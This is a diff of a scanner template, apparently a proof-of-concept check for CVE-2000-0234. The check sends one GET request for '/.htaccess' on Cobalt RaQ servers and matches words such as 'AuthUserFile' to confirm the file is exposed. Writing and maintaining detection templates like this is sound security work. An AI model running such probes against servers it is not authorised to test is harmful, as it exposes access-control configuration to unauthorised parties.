@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测Cobalt RaQ2/RaQ3服务器是否因默认access.conf配置允许未授权访问.htaccess文件，导致敏感配置信息泄露"
+author = "ave"
+description = "检测 Cobalt RaQ 2.0/3.0 服务器的 .htaccess 文件信息泄露漏洞，通过发送 GET 请求访问敏感的 .htaccess 文件"
 id = "POC-AVE-2000-0212"
-name = "CVE-2000-0234 PoC"
+name = "Cobalt RaQ .htaccess 信息泄露漏洞 PoC"
 severity = "medium"
 tags = ["ave-2000-0212"]
 vuln_id = [
@@ -11,12 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/.htaccess"
+path = "/.htaccess"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -28,10 +31,6 @@ expect = true
 part = "body"
 type = "word"
 words = [
-    "AuthType",
-    "Require",
-    "Order allow",
-    "Order deny",
-    "RewriteRule",
-    "RewriteCond",
+    "AuthUserFile",
+    "AllowOverride",
 ]
